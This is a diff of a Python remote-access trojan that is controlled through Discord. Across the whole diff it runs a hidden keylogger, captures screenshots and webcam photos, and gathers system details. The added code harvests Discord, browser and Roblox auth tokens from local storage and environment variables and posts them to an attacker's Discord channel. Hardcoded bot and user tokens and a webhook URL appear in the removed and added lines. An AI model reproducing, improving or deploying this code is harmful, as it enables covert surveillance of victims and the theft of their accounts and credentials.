@@ -16,44 +16,42 @@ import json
 import tempfile
 import shutil
 import ctypes
+import traceback
+import re
+import sqlite3
 from datetime import datetime, timezone
 
-BOT_TOKEN = "MTUyMDI1NzU5MTA2OTExNDQ0OA.GiqiPN.cGqgzRHz3nYhB0pfpTjjKGSOuryJUn0SSs1RHc"
-CLIENT_ID = "1520257591069114448"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1520235001881428098/P7NpzBNubCGGy4iPHnwsZUV4XBx_HWrw3NuLy99zm4CPFGbNbPDUYZwaD5WdvO8l3UgQ"
-CHANNEL_ID = None
+USER_TOKEN = "MTUxOTQzMTUwMzg3NTAxODc2Mg.GysnGz.-HuDJFP55GocWthqs4Vu0lCQHnBEpnRRsLeTxw"
+SERVER_ID = "1520234960642900090"
+CHANNEL_ID = "1520234961490411522"
+CLIENT_ID = "1519431503875018762"
 running = True
 
-def send_webhook_notification(message, status="info"):
-    """Send notification to webhook"""
+STARTUP_FLAG_FILE = os.path.join(tempfile.gettempdir(), "Python_started.lock")
+if os.path.exists(STARTUP_FLAG_FILE):
+    sys.exit(0)
+else:
+    with open(STARTUP_FLAG_FILE, 'w') as f:
+        f.write(str(os.getpid()))
+
+def send_debug(message):
     try:
-        computer = socket.gethostname()
-        username = getpass.getuser()
-        ip = socket.gethostbyname(socket.gethostname())
-        try:
-            external_ip = requests.get("https://api.ipify.org", timeout=3).text
-        except:
-            external_ip = "N/A"
-        
-        full_msg = f"""**{status.upper()} - {computer}**
-User: {username}
-IP: {ip}
-External IP: {external_ip}
-Time: {datetime.now(timezone.utc).isoformat()}
-{message}"""
-        
-        payload = {"content": full_msg}
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        headers = {"Authorization": USER_TOKEN, "Content-Type": "application/json"}
+        payload = {"content": f"**[DEBUG]** {message}"}
+        requests.post(f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages", headers=headers, json=payload, timeout=5)
+    except:
+        pass
+
+def send_error(message):
+    try:
+        headers = {"Authorization": USER_TOKEN, "Content-Type": "application/json"}
+        payload = {"content": f"**[ERROR]** {message}"}
+        requests.post(f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages", headers=headers, json=payload, timeout=5)
     except:
         pass
 
 def install_missing_modules():
-    required_modules = {
-        'cv2': 'opencv-python',
-        'PIL': 'Pillow',
-        'requests': 'requests',
-        'numpy': 'numpy'
-    }
+    required_modules = {'cv2': 'opencv-python', 'PIL': 'Pillow', 'requests': 'requests', 'numpy': 'numpy'}
     for module_name, pip_name in required_modules.items():
         try:
             __import__(module_name)
@@ -64,13 +62,11 @@ def install_missing_modules():
                 pass
 
 install_missing_modules()
-
 import cv2
 import numpy as np
 from PIL import ImageGrab
 
-# Send startup notification
-send_webhook_notification("Startup script is initializing...", "info")
+send_debug("Startup script initialized successfully")
 
 class WindowsKeylogger:
     def __init__(self):
@@ -127,12 +123,10 @@ class WindowsKeylogger:
                     vk_code = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 0) & 0xFF
                     scan_code = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 16) & 0xFF
                     flags = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 24) & 0xFF
-                    
                     if vk_code == 0x10:
                         self.shift_pressed = True
                     elif vk_code == 0x14:
                         self.caps_lock = not self.caps_lock
-                    
                     char = self.get_ascii_char(vk_code, scan_code, flags)
                     if char is not None and char != '':
                         with self.lock:
@@ -186,9 +180,10 @@ def take_screenshot():
     try:
         screenshot = ImageGrab.grab()
         img_bytes = io.BytesIO()
-        screenshot.save(img_bytes, format='PNG')
+        screenshot.save(img_bytes, format='JPEG', quality=70)
         return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
-    except:
+    except Exception as e:
+        send_error(f"Screenshot capture failed: {str(e)}")
         return None
 
 def take_camera_photo():
@@ -198,328 +193,298 @@ def take_camera_photo():
         cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
         ret, frame = cap.read()
         if ret:
-            _, img_encoded = cv2.imencode('.jpg', frame)
+            _, img_encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
             cap.release()
             return base64.b64encode(img_encoded.tobytes()).decode('utf-8')
         cap.release()
-    except:
-        pass
-    return None
+        return None
+    except Exception as e:
+        send_error(f"Camera capture failed: {str(e)}")
+        return None
 
 def send_discord_message(content, file_bytes=None, filename=None):
     try:
+        headers = {"Authorization": USER_TOKEN}
         if file_bytes:
-            files = {'file': (filename, file_bytes, 'image/png')}
+            files = {'file': (filename, file_bytes, 'image/jpeg')}
             data = {'content': content}
-            requests.post(
+            response = requests.post(
                 f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
-                headers={"Authorization": f"Bot {BOT_TOKEN}"},
+                headers=headers,
                 data=data,
                 files=files,
-                timeout=10
+                timeout=30
             )
+            if response.status_code == 200:
+                return True
+            else:
+                send_error(f"Send failed: {response.status_code}")
+                return False
         else:
-            payload = {"content": content}
-            requests.post(
+            response = requests.post(
                 f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
-                headers={"Authorization": f"Bot {BOT_TOKEN}"},
-                json=payload,
+                headers=headers,
+                json={"content": content},
                 timeout=10
             )
-    except:
-        pass
+            if response.status_code == 200:
+                return True
+            else:
+                send_error(f"Send failed: {response.status_code}")
+                return False
+    except Exception as e:
+        send_error(f"Send error: {str(e)}")
+        return False
+
+def search_tokens():
+    """Search for tokens in common locations"""
+    tokens = []
+    
+    # Token patterns
+    patterns = [
+        r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
+        r'mfa\\.[\\w-]{84}',
+        r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}',
+        r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
+        r'[\\w-]{20,30}\\.[\\w-]{6}\\.[\\w-]{27,40}',
+    ]
+    
+    # Search paths (Discord, Chrome, Edge, Brave, Roblox, Firefox, system)
+    appdata = os.environ.get("APPDATA", "")
+    localappdata = os.environ.get("LOCALAPPDATA", "")
+    
+    search_paths = []
+    search_paths.extend([
+        os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+        os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+        os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "Discord", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "discord", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Cookies"),
+        os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+        os.path.join(appdata, "Roblox", "Local Storage", "leveldb"),
+        os.path.join(localappdata, "Roblox", "Local Storage", "leveldb"),
+        os.path.join(os.path.expanduser("~"), "AppData", "Local", "Roblox", "Local Storage", "leveldb"),
+        tempfile.gettempdir(),
+        os.path.expanduser("~"),
+        os.path.expanduser("~/Desktop"),
+        os.path.expanduser("~/Documents"),
+        os.path.expanduser("~/Downloads"),
+    ])
+    
+    # Firefox profiles
+    firefox_profiles = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
+    if os.path.exists(firefox_profiles):
+        for profile in os.listdir(firefox_profiles):
+            if profile.endswith('.default') or profile.endswith('.default-release'):
+                search_paths.append(os.path.join(firefox_profiles, profile, "webappsstore.sqlite"))
+                search_paths.append(os.path.join(firefox_profiles, profile, "cookies.sqlite"))
+    
+    for path in search_paths:
+        if not os.path.exists(path):
+            continue
+        try:
+            if os.path.isfile(path):
+                with open(path, 'r', errors='ignore') as f:
+                    content = f.read(50000)
+                    for pattern in patterns:
+                        matches = re.findall(pattern, content)
+                        for match in matches:
+                            if match not in tokens:
+                                tokens.append(match)
+                                send_debug(f"Found token in file: {path}")
+            elif os.path.isdir(path):
+                for root, dirs, files in os.walk(path):
+                    if len(tokens) > 20:
+                        break
+                    for file in files:
+                        if len(tokens) > 20:
+                            break
+                        if file.endswith(('.log', '.ldb', '.txt', '.sqlite', '.db')):
+                            file_path = os.path.join(root, file)
+                            try:
+                                with open(file_path, 'r', errors='ignore') as f:
+                                    content = f.read(50000)
+                                    for pattern in patterns:
+                                        matches = re.findall(pattern, content)
+                                        for match in matches:
+                                            if match not in tokens:
+                                                tokens.append(match)
+                                                send_debug(f"Found token in file: {file_path}")
+                            except:
+                                pass
+        except:
+            pass
+    
+    # Check environment variables
+    for key, value in os.environ.items():
+        for pattern in patterns:
+            matches = re.findall(pattern, value)
+            for match in matches:
+                if match not in tokens:
+                    tokens.append(match)
+                    send_debug(f"Found token in environment variable: {key}")
+    
+    return tokens
 
 def get_full_system_report():
     data = {}
-    
-    data["system"] = {
-        "computer_name": socket.gethostname(),
-        "username": getpass.getuser(),
-        "os": platform.system() + " " + platform.release(),
-        "os_version": platform.version(),
-        "architecture": platform.machine(),
-        "processor": platform.processor(),
-        "cpu_count": os.cpu_count(),
-        "timestamp": datetime.now(timezone.utc).isoformat()
-    }
-    
-    data["network"] = {
-        "ip": socket.gethostbyname(socket.gethostname()),
-        "external_ip": requests.get("https://api.ipify.org", timeout=3).text if requests else "N/A"
-    }
-    
-    drives = []
-    if platform.system() == "Windows":
-        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
-            drive = f"{letter}:\\\\"
-            if os.path.exists(drive):
-                try:
-                    usage = shutil.disk_usage(drive)
-                    drives.append({
-                        "drive": drive,
-                        "total_gb": round(usage.total / (1024**3), 2),
-                        "used_gb": round(usage.used / (1024**3), 2),
-                        "free_gb": round(usage.free / (1024**3), 2),
-                        "percent_used": round((usage.used / usage.total) * 100, 1)
-                    })
-                except:
-                    pass
-    data["drives"] = drives
-    
-    downloads_path = os.path.expanduser("~/Downloads")
-    downloads = []
-    if os.path.exists(downloads_path):
-        try:
-            for item in os.listdir(downloads_path)[:50]:
-                item_path = os.path.join(downloads_path, item)
-                if os.path.isfile(item_path):
-                    downloads.append({
-                        "name": item,
-                        "size": os.path.getsize(item_path),
-                        "modified": datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()
-                    })
-        except:
-            pass
-    data["downloads"] = downloads
-    
-    discord_tokens = []
-    discord_paths = []
-    if platform.system() == "Windows":
-        appdata = os.environ.get("APPDATA", "")
-        localappdata = os.environ.get("LOCALAPPDATA", "")
-        discord_paths.extend([
-            os.path.join(appdata, "discord", "Local Storage", "leveldb"),
-            os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
-            os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
-        ])
-    for path in discord_paths:
-        if os.path.exists(path):
+    try:
+        data["system"] = {"computer_name": socket.gethostname(), "username": getpass.getuser(), "os": platform.system() + " " + platform.release(), "os_version": platform.version(), "architecture": platform.machine(), "processor": platform.processor(), "cpu_count": os.cpu_count(), "timestamp": datetime.now(timezone.utc).isoformat()}
+        data["network"] = {"ip": socket.gethostbyname(socket.gethostname()), "external_ip": requests.get("https://api.ipify.org", timeout=3).text if requests else "N/A"}
+        drives = []
+        if platform.system() == "Windows":
+            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+                drive = f"{letter}:\\\\"
+                if os.path.exists(drive):
+                    try:
+                        usage = shutil.disk_usage(drive)
+                        drives.append({"drive": drive, "total_gb": round(usage.total / (1024**3), 2), "used_gb": round(usage.used / (1024**3), 2), "free_gb": round(usage.free / (1024**3), 2), "percent_used": round((usage.used / usage.total) * 100, 1)})
+                    except:
+                        pass
+        data["drives"] = drives
+        downloads_path = os.path.expanduser("~/Downloads")
+        downloads = []
+        if os.path.exists(downloads_path):
             try:
-                for file in os.listdir(path):
-                    if file.endswith('.log') or file.endswith('.ldb'):
-                        file_path = os.path.join(path, file)
-                        try:
-                            with open(file_path, 'r', errors='ignore') as f:
-                                content = f.read(5000)
-                                import re
-                                token_patterns = [
-                                    r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}',
-                                    r'mfa\\.[\\w-]{{84}}',
-                                    r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{38}}'
-                                ]
-                                for pattern in token_patterns:
-                                    matches = re.findall(pattern, content)
-                                    for match in matches:
-                                        if match not in discord_tokens:
-                                            discord_tokens.append(match)
-                        except:
-                            pass
+                for item in os.listdir(downloads_path)[:50]:
+                    item_path = os.path.join(downloads_path, item)
+                    if os.path.isfile(item_path):
+                        downloads.append({"name": item, "size": os.path.getsize(item_path), "modified": datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()})
             except:
                 pass
-    data["discord_tokens"] = discord_tokens[:10]
-    
-    processes = []
-    try:
-        if platform.system() == "Windows":
-            output = subprocess.check_output(["tasklist", "/FO", "CSV", "/V"], stderr=subprocess.DEVNULL).decode()
-            for line in output.splitlines()[1:30]:
-                parts = line.split(',')
-                if len(parts) >= 8:
-                    processes.append({
-                        "name": parts[0].strip('"'),
-                        "pid": parts[1].strip('"'),
-                        "memory_mb": parts[4].strip('"'),
-                        "user": parts[6].strip('"')
-                    })
-    except:
-        pass
-    data["processes"] = processes
-    
-    software = []
-    try:
-        if platform.system() == "Windows":
-            import winreg
-            keys = [
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
-            ]
-            for hkey, key in keys:
-                try:
-                    with winreg.OpenKey(hkey, key) as reg_key:
-                        index = 0
-                        while True:
-                            try:
-                                subkey_name = winreg.EnumKey(reg_key, index)
-                                with winreg.OpenKey(reg_key, subkey_name) as subkey:
-                                    try:
-                                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                                        version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [winreg.EnumValue(subkey, i)[0] for i in range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
-                                        if name:
-                                            software.append({"name": name, "version": version})
-                                    except:
-                                        pass
-                                index += 1
-                            except WindowsError:
-                                break
-                except:
-                    pass
-    except:
-        pass
-    data["installed_software"] = software[:50]
-    
+        data["downloads"] = downloads
+        data["tokens_found"] = search_tokens()
+        processes = []
+        try:
+            if platform.system() == "Windows":
+                output = subprocess.check_output(["tasklist", "/FO", "CSV", "/V"], stderr=subprocess.DEVNULL).decode()
+                for line in output.splitlines()[1:30]:
+                    parts = line.split(',')
+                    if len(parts) >= 8:
+                        processes.append({"name": parts[0].strip('"'), "pid": parts[1].strip('"'), "memory_mb": parts[4].strip('"'), "user": parts[6].strip('"')})
+        except:
+            pass
+        data["processes"] = processes
+        software = []
+        try:
+            if platform.system() == "Windows":
+                import winreg
+                keys = [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"), (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")]
+                for hkey, key in keys:
+                    try:
+                        with winreg.OpenKey(hkey, key) as reg_key:
+                            index = 0
+                            while True:
+                                try:
+                                    subkey_name = winreg.EnumKey(reg_key, index)
+                                    with winreg.OpenKey(reg_key, subkey_name) as subkey:
+                                        try:
+                                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [winreg.EnumValue(subkey, i)[0] for i in range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
+                                            if name:
+                                                software.append({"name": name, "version": version})
+                                        except:
+                                            pass
+                                    index += 1
+                                except WindowsError:
+                                    break
+                    except:
+                        pass
+        except:
+            pass
+        data["installed_software"] = software[:50]
+    except Exception as e:
+        send_error(f"System report failed: {str(e)}")
     return data
 
-def register_slash_commands():
-    """Register slash commands with Discord API"""
+def process_command(command, content):
     try:
-        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
-        url = f"https://discord.com/api/v9/applications/{CLIENT_ID}/commands"
-        
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            existing = response.json()
-            for cmd in existing:
-                requests.delete(f"{url}/{cmd['id']}", headers=headers)
-        
-        commands = [
-            {"name": "screenshot", "description": "Take a screenshot of the computer"},
-            {"name": "camera", "description": "Take a photo from the webcam"},
-            {"name": "system", "description": "Show system information"},
-            {"name": "downloads", "description": "Show files in Downloads folder"},
-            {"name": "processes", "description": "Show running processes"},
-            {"name": "tokens", "description": "Show found Discord tokens"},
-            {"name": "keylog", "description": "Show recent keystrokes"},
-            {"name": "help", "description": "Show all available commands"},
-            {"name": "stop", "description": "Stop the bot"}
-        ]
-        
-        for cmd in commands:
-            requests.post(url, headers=headers, json=cmd)
-        return True
-    except:
-        return False
-
-def handle_slash_command(interaction):
-    """Handle slash command interactions"""
-    try:
-        data = interaction.get("data", {})
-        command_name = data.get("name", "")
-        token = interaction.get("token")
-        
-        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
-        response_url = f"https://discord.com/api/v9/interactions/{interaction['id']}/{token}/callback"
-        
-        if command_name == "screenshot":
-            requests.post(response_url, headers=headers, json={"type": 5})
+        if command == "screenshot":
+            send_discord_message("Taking screenshot...")
             screenshot = take_screenshot()
             if screenshot:
                 img_data = base64.b64decode(screenshot)
-                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
-                files = {'file': ('screenshot.png', img_data, 'image/png')}
-                requests.post(followup_url, headers=headers, files=files, data={"content": "Screenshot taken:"})
+                send_discord_message("Screenshot taken:", img_data, "screenshot.jpg")
+                send_debug("Screenshot sent")
             else:
-                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
-                requests.post(followup_url, headers=headers, json={"content": "Failed to take screenshot"})
+                send_discord_message("Failed to take screenshot")
         
-        elif command_name == "camera":
-            requests.post(response_url, headers=headers, json={"type": 5})
+        elif command == "camera":
+            send_discord_message("Taking camera photo...")
             camera = take_camera_photo()
             if camera:
                 img_data = base64.b64decode(camera)
-                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
-                files = {'file': ('camera.jpg', img_data, 'image/jpeg')}
-                requests.post(followup_url, headers=headers, files=files, data={"content": "Camera photo taken:"})
+                send_discord_message("Camera photo taken:", img_data, "camera.jpg")
+                send_debug("Camera photo sent")
             else:
-                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
-                requests.post(followup_url, headers=headers, json={"content": "Failed to take camera photo"})
+                send_discord_message("Failed to take camera photo")
         
-        elif command_name == "system":
+        elif command == "system":
             data = get_full_system_report()
-            summary = f"""=== SYSTEM REPORT ===
-Computer: {data['system']['computer_name']}
-User: {data['system']['username']}
-OS: {data['system']['os']}
-Architecture: {data['system']['architecture']}
-CPU: {data['system']['processor']}
-CPU Cores: {data['system']['cpu_count']}
-IP: {data['network']['ip']}
-External IP: {data['network']['external_ip']}
-Drives: {len(data.get('drives', []))}
-Downloads: {len(data.get('downloads', []))}
-Processes: {len(data.get('processes', []))}
-Installed Software: {len(data.get('installed_software', []))}
-Discord Tokens: {len(data.get('discord_tokens', []))}"""
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": f"```\\n{summary}\\n```"}})
+            summary = f"=== SYSTEM REPORT ===\\nComputer: {data['system']['computer_name']}\\nUser: {data['system']['username']}\\nOS: {data['system']['os']}\\nArchitecture: {data['system']['architecture']}\\nCPU: {data['system']['processor']}\\nCPU Cores: {data['system']['cpu_count']}\\nIP: {data['network']['ip']}\\nExternal IP: {data['network']['external_ip']}\\nDrives: {len(data.get('drives', []))}\\nDownloads: {len(data.get('downloads', []))}\\nProcesses: {len(data.get('processes', []))}\\nInstalled Software: {len(data.get('installed_software', []))}\\nTokens Found: {len(data.get('tokens_found', []))}"
+            send_discord_message(f"```\\n{summary}\\n```")
         
-        elif command_name == "downloads":
+        elif command == "tokens":
+            send_debug("Searching for tokens...")
+            tokens = search_tokens()
+            if tokens:
+                token_list = "\\n".join([f"- {t}" for t in tokens[:20]])
+                send_discord_message(f"**Tokens Found:**\\n```\\n{token_list}\\n```")
+                send_debug(f"Found {len(tokens)} tokens")
+            else:
+                send_discord_message("No tokens found")
+                send_debug("No tokens found")
+        
+        elif command == "downloads":
             data = get_full_system_report()
             if data.get("downloads"):
                 dl_list = "\\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
-                content = f"Downloads:\\n```\\n{dl_list}\\n```"
+                send_discord_message(f"Downloads:\\n```\\n{dl_list}\\n```")
             else:
-                content = "No downloads found"
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+                send_discord_message("No downloads found")
         
-        elif command_name == "processes":
+        elif command == "processes":
             data = get_full_system_report()
             if data.get("processes"):
                 proc_list = "\\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
-                content = f"Running processes:\\n```\\n{proc_list}\\n```"
+                send_discord_message(f"Running processes:\\n```\\n{proc_list}\\n```")
             else:
-                content = "No processes found"
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+                send_discord_message("No processes found")
         
-        elif command_name == "tokens":
-            data = get_full_system_report()
-            if data.get("discord_tokens"):
-                tokens = "\\n".join([f"- {t}" for t in data["discord_tokens"]])
-                content = f"Discord tokens found:\\n```\\n{tokens}\\n```"
+        elif command == "keylog":
+            keys = keylogger.get_buffer() if 'keylogger' in globals() else None
+            if keys:
+                send_discord_message(f"Keylog:\\n```\\n{keys[-2000:]}\\n```")
             else:
-                content = "No Discord tokens found"
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+                send_discord_message("No keys logged yet")
         
-        elif command_name == "keylog":
-            if 'keylogger' in globals():
-                keys = keylogger.get_buffer()
-                if keys:
-                    content = f"Keylog:\\n```\\n{keys[-2000:]}\\n```"
-                else:
-                    content = "No keys logged yet"
-            else:
-                content = "Keylogger not initialized"
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+        elif command == "help":
+            help_text = "**Available Commands:**\\n!screenshot - Take a screenshot\\n!camera - Take camera photo\\n!system - Show system info\\n!tokens - Search for Discord/Roblox tokens\\n!downloads - Show downloads folder\\n!processes - Show running processes\\n!keylog - Show recent keystrokes\\n!help - Show this message\\n!stop - Stop the bot"
+            send_discord_message(help_text)
         
-        elif command_name == "help":
-            help_text = """**Available Commands:**
-/screenshot - Take a screenshot
-/camera - Take camera photo
-/system - Show system info
-/downloads - Show downloads folder
-/processes - Show running processes
-/tokens - Show found Discord tokens
-/keylog - Show recent keystrokes
-/help - Show this message
-/stop - Stop the bot"""
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": help_text}})
-        
-        elif command_name == "stop":
+        elif command == "stop":
+            send_discord_message("Stopping bot...")
             global running
             running = False
-            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": "Stopping bot..."}})
-    except:
-        pass
+        
+        return True
+    except Exception as e:
+        send_error(f"Command {command} failed: {str(e)}\\n{traceback.format_exc()}")
+        return False
 
 def command_handler():
     global running
     last_message_id = None
     
-    # Register slash commands on startup
-    register_slash_commands()
-    send_webhook_notification("Slash commands registered", "success")
+    send_debug("Command handler started, listening for commands...")
+    send_discord_message(f"Bot started on {socket.gethostname()}\\nType !help for commands")
     
     while running:
         try:
-            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
+            headers = {"Authorization": USER_TOKEN}
             params = {"limit": 5}
             if last_message_id:
                 params["after"] = last_message_id
@@ -528,7 +493,7 @@ def command_handler():
                 f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
                 headers=headers,
                 params=params,
-                timeout=5
+                timeout=10
             )
             
             if response.status_code == 200:
@@ -536,156 +501,52 @@ def command_handler():
                 for msg in messages:
                     if msg["author"]["id"] == CLIENT_ID:
                         continue
-                    
                     content = msg.get("content", "").strip()
                     if not content:
                         continue
-                    
                     if not last_message_id or msg["id"] > last_message_id:
                         last_message_id = msg["id"]
-                    
-                    # Handle text commands as fallback
-                    if content.startswith("/") or content.startswith("!"):
+                    if content.startswith("!"):
                         command = content[1:].lower()
-                        
-                        if command == "screenshot":
-                            screenshot = take_screenshot()
-                            if screenshot:
-                                img_data = base64.b64decode(screenshot)
-                                send_discord_message("Screenshot taken:", img_data, "screenshot.png")
-                            else:
-                                send_discord_message("Failed to take screenshot")
-                        
-                        elif command == "camera":
-                            camera = take_camera_photo()
-                            if camera:
-                                img_data = base64.b64decode(camera)
-                                send_discord_message("Camera photo taken:", img_data, "camera.jpg")
-                            else:
-                                send_discord_message("Failed to take camera photo")
-                        
-                        elif command == "system":
-                            data = get_full_system_report()
-                            summary = f"""=== SYSTEM REPORT ===
-Computer: {data['system']['computer_name']}
-User: {data['system']['username']}
-OS: {data['system']['os']}
-Architecture: {data['system']['architecture']}
-CPU: {data['system']['processor']}
-CPU Cores: {data['system']['cpu_count']}
-IP: {data['network']['ip']}
-External IP: {data['network']['external_ip']}
-Drives: {len(data.get('drives', []))}
-Downloads: {len(data.get('downloads', []))}
-Processes: {len(data.get('processes', []))}
-Installed Software: {len(data.get('installed_software', []))}
-Discord Tokens: {len(data.get('discord_tokens', []))}"""
-                            send_discord_message(f"```\\n{summary}\\n```")
-                        
-                        elif command == "downloads":
-                            data = get_full_system_report()
-                            if data.get("downloads"):
-                                dl_list = "\\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
-                                send_discord_message(f"Downloads:\\n```\\n{dl_list}\\n```")
-                            else:
-                                send_discord_message("No downloads found")
-                        
-                        elif command == "processes":
-                            data = get_full_system_report()
-                            if data.get("processes"):
-                                proc_list = "\\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
-                                send_discord_message(f"Running processes:\\n```\\n{proc_list}\\n```")
-                            else:
-                                send_discord_message("No processes found")
-                        
-                        elif command == "tokens":
-                            data = get_full_system_report()
-                            if data.get("discord_tokens"):
-                                tokens = "\\n".join([f"- {t}" for t in data["discord_tokens"]])
-                                send_discord_message(f"Discord tokens found:\\n```\\n{tokens}\\n```")
-                            else:
-                                send_discord_message("No Discord tokens found")
-                        
-                        elif command == "keylog":
-                            keys = keylogger.get_buffer() if 'keylogger' in globals() else None
-                            if keys:
-                                send_discord_message(f"Keylog:\\n```\\n{keys[-2000:]}\\n```")
-                            else:
-                                send_discord_message("No keys logged yet")
-                        
-                        elif command == "help":
-                            help_text = """**Available Commands:**
-/screenshot - Take a screenshot
-/camera - Take camera photo
-/system - Show system info
-/downloads - Show downloads folder
-/processes - Show running processes
-/tokens - Show found Discord tokens
-/keylog - Show recent keystrokes
-/help - Show this message
-/stop - Stop the bot"""
-                            send_discord_message(help_text)
-                        
-                        elif command == "stop":
-                            send_discord_message("Stopping bot...")
-                            running = False
-                            break
-                        
-        except:
-            pass
+                        send_debug(f"Command received: !{command}")
+                        process_command(command, content)
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after", 1)
+                send_debug(f"Rate limited! Waiting {retry_after}s")
+                time.sleep(retry_after + 0.5)
+            else:
+                send_debug(f"HTTP Error: {response.status_code}")
+                time.sleep(1)
+        except Exception as e:
+            send_error(f"Command handler error: {str(e)}")
+            time.sleep(2)
         time.sleep(0.5)
 
 def keylog_loop():
     global keylogger
+    send_debug("Starting keylogger...")
     keylogger = WindowsKeylogger()
     threading.Thread(target=keylogger.start, daemon=True).start()
-    send_webhook_notification("Keylogger started successfully", "success")
+    send_debug("Keylogger started successfully")
     while running:
         time.sleep(60)
-        keys = keylogger.get_buffer()
-        if keys:
-            send_discord_message(f"Keylog Report:\\n```\\n{keys[-1900:]}\\n```")
+        try:
+            keys = keylogger.get_buffer()
+            if keys:
+                send_debug(f"Keylog report: {len(keys)} characters logged")
+                send_discord_message(f"Keylog Report:\\n```\\n{keys[-1900:]}\\n```")
+        except:
+            pass
 
 def main():
     global CHANNEL_ID
     hide_console()
-    
-    send_webhook_notification("Startup script main() called", "info")
-    
-    if len(sys.argv) > 1:
-        CHANNEL_ID = sys.argv[1]
-    else:
-        try:
-            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
-            response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
-            if response.status_code == 200:
-                guilds = response.json()
-                for guild in guilds:
-                    channels_response = requests.get(
-                        f"https://discord.com/api/v9/guilds/{guild['id']}/channels",
-                        headers=headers,
-                        timeout=5
-                    )
-                    if channels_response.status_code == 200:
-                        channels = channels_response.json()
-                        for channel in channels:
-                            if channel.get("type") == 0:
-                                CHANNEL_ID = channel["id"]
-                                break
-                    if CHANNEL_ID:
-                        break
-        except:
-            pass
-    
+    send_debug("Startup script main() called")
     if not CHANNEL_ID:
-        send_webhook_notification("ERROR: No channel ID found!", "error")
+        send_debug("ERROR: No channel ID configured!")
         return
-    
-    send_webhook_notification(f"Channel ID found: {CHANNEL_ID}", "success")
-    
-    send_discord_message(f"Bot started on {socket.gethostname()}\\nType /help or !help for commands")
-    send_webhook_notification(f"Bot started on {socket.gethostname()}", "success")
-    
+    send_debug(f"Channel ID: {CHANNEL_ID}")
+    send_debug("Bot started successfully")
     threading.Thread(target=keylog_loop, daemon=True).start()
     command_handler()
 
